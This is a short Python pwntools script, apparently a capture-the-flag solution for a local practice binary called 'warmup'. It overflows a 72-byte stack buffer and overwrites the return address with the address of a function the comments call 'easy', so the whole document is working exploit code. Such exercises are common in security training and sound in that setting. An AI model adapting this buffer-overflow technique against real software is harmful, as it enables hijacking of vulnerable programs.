from pwn import *

target = process('./warmup')
#gdb.attach(target, gdbscript = 'b *0x4006a3')

# Make the payload
payload = ""
payload += "0"*72 # Overflow the buffer up to the return address
payload += '\x0d\x06\x40\x00\x00\x00\x00\x00'

#payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function

# Send the payload
target.sendline(payload)
print target.recvline()

